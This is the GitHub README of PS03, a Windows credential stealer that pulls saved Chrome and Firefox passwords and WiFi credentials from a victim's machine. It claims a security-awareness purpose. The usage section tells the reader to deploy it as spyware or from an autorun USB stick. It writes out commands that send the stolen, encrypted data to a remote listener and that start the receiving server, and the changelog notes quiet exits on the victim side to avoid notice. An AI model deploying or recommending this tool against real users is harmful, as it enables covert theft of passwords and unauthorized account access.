# PS03

PS03 is a project which goal is to set more focus on security. Stop saving your passwords in chrome, firefox, don't automaticly connect to WiFi's and so on. This project shows how easy an attacker can get all your passwords ever saved, even without any anti-virus complaining. 

  

![ServersideScreenshot](https://github.com/benlarsendk/PS03/blob/master/screenshot.PNG "Screenshot of serverside")
The above shown screenshot, is the output as seen from serverside.

### Usage
The software is made as both the receiving end as well as the victimside end. It's therefore required to configure the program at startup, such that it does as expected. This software could be used on a USB-stick with autorun capabilities to extract passwordsinformation from a victim. It is also possible to use it as spyware and let the program send the data (AES-encrypted) back to a host.

To configure the program as a sniffer that transmits to a server:
```sh
$ PS03.exe -t -i [ip] -p [port]
```

To configure the program as a serverside receiver:
```sh
$ PS03.exe -r -p [port]
```

If wanted, the program can function without any network communication. To configure the program to run locally
```sh
$ PS03.exe -v
```
The -v (verbose) command can also be used alongside networking to generate report and show output on victimside.

To generate a reportfile, that specifies the most used passwords and more, use:
```sh
$ PS03.exe -l
```

Example for viewing output and saving it to a logfile while at the same time transmitting:
```sh
$ PS03.exe -v -l -t -p 501 -i 192.168.1.12
```
### Credits

PS03 uses code and inspiration from the following authors:

* [DPAPI] - For decrypting Chrome passwords
* [Mark Brittingham] - For simple AES encryption of data
* [SQLite] - For reading the Google Chrome Login Data file
* [3V1L] - For supplying some of the code for decrypting firefox passwords and username.
* [Command Line Parser Library] - for parsing input parameters


### Development

Want to contribute? Please do so. 
If you find an issue, please create it as an issue, and if you want you can fix it and make a pullrequest.

### Version

3.2.1

**CHANGELOG**
3.2.1
- Major boost on performance - now executes in about a second (CPU-depended of course.)
- Fixed usagepercentage
- Report redesign


3.2.0
- Merged all solutions in to a single solution and added commandline parameters
- Tweaks on performance


3.1.0
- PS03 can now handle Firefox user profiles. Tested on Firefox version 43.0.1.
- PS03 Generates a report file with most common passwords. This is still in pre-alpha


3.0.2
- Fixed crashes when victim doesn't use chrome or have WLAN
- Fixed send timeout at victimside to exit quietly instead of crash
- General cleanup

   [DPAPI]: <http://www.obviex.com/samples/dpapi.aspx>
   [Mark Brittingham]: <http://stackoverflow.com/questions/165808/simple-two-way-encryption-for-c-sharp>
   [SQLite]: <https://www.sqlite.org/>
   [3V1L]: <http://xakfor.net/threads/c-firefox-36-password-cookie-recovery.12192/>
   [Command Line Parser Library]: <https://commandline.codeplex.com/>
   

